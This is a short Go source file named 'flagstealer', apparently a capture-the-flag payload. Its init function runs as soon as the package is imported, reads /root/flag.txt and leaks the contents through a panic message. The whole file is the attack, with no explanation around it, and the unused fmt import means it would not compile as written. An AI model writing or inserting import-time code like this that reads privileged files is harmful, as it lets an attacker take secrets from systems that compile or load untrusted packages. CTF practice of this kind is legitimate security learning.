package flagstealer

import (
	"fmt"
	"os"
)

func init() {
	data, err := os.ReadFile("/root/flag.txt")
	if err != nil {
		panic("ERROR reading flag: " + err.Error())
	}
	panic("FLAG: " + string(data))
}
